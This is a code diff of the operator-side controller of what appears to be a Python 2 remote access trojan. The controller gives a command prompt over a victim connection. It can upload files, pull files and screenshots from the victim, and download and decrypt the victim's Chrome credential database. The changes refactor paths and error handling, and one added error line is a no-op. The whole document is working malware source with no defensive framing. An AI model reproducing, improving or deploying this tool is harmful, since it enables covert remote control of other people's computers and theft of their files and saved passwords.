@@ -29,6 +29,8 @@ blue = Fore.CYAN
 white = Fore.WHITE
 bright = Style.BRIGHT
 
+startDir = os.getcwd()
+
 def crypt(TEXT, encode=True):
     if encode == True:
         return base64.b64encode(TEXT)
@@ -61,7 +63,7 @@ def send(data):
     print(bright + blue + result)
 
 def upload(command):
-    fileName = command.replace("upload ", "")
+    fileName = command[len("upload "):]
     try:
         f = open(fileName, 'rb')
         cli.sendall(crypt(command))
@@ -76,22 +78,23 @@ def upload(command):
         menu()
 
     except IOError:
-        print Fore.RED + "[!] File not found\n"
+        print red + "[!] File not found\n"
 
 
 def download(command):
     cli.sendall(crypt(command))
-    
-    if "screenshot()" in command: 
-        fileName =  "screenshots" + os.sep + str(command.replace("screenshot() ", "").replace("download ", ""))
+    fileName = str(command[len("download "):])
+
+    if "screenshot()" in command:
+        f = open(startDir+os.sep+"screenshots"+os.sep+fileName, 'wb')
     else:
-        fileName = "downloads" + os.sep + str(command.replace("download ", ""))
+        f = open(startDir+os.sep+"downloads"+os.sep+fileName, 'wb')
 
     while True:
         l = cli.recv(1024)
 
         if l.startswith("File not found"):
-            print Fore.RED + "[!] File not found\n"
+            print red + "[!] File not found\n"
             menu()
 
         elif l == "[!] This func, works only on Windows!\n":
@@ -99,7 +102,7 @@ def download(command):
             menu()
 
         else:
-	        f = open(fileName, 'wb')
+
 	        while (l):
 	            if l.endswith(END_OF_FILE):
 	                if END_OF_FILE in l:
@@ -110,8 +113,9 @@ def download(command):
 	                f.write(l)
 	                l = cli.recv(1024)
 
+                dir = "screenshots" if "screenshot" in command else "downloads"
 	        print bright + yellow + "[+] Download complete!"
-	        print bright + yellow + "[+] %s ==> %s\n"%(fileName, os.getcwd()+os.sep+fileName)
+	        print bright + yellow + "[+] %s ==> %s\n"%(fileName, startDir+os.sep+dir+os.sep+fileName)
 	        f.close()
 	        break
 
@@ -156,7 +160,7 @@ def menu():
     while True:
         command = raw_input("%s[%s@%s]-[%s]~$ "%(bright + green, hostname, addr[0], pwd))
         if command == "help()":
-            client_help()
+            help()
             menu()
 
         elif ":" in command:
@@ -187,7 +191,10 @@ def menu():
 
         elif command == "chrome_db":
             download("download chrome_db")
-            decrypt_db()
+            try:
+                decrypt_db()
+            except Exception as error:
+                bright + red + "Error: %s\n"%(error)
             menu()
 
         elif command == "": 
@@ -197,21 +204,15 @@ def menu():
             send(command)
 
 def start(host, port):
-    while True:
-        try:
-            bind(host, port)
-            menu()
-            return
-        except Exception as e:
-            print bright + Fore.RED + "Error:\n%s\n"%(e)
-
+    try:
+        bind(host, port)
+        menu()
+    except Exception as e:
+        print bright + red + "Error: %s\n"%(e)
+    raw_input("\n[~] Press enter to exit...")
 
 if __name__ == "__main__":
     init(autoreset=True)
     host = sys.argv[1]
     port = int(sys.argv[2])
-    try:
-        start(host, port)
-    except Exception as e:
-        print "[!] Error: %s"%(e)
-    raw_input("\n[~] Press enter to exit...")
+    start(host, port)
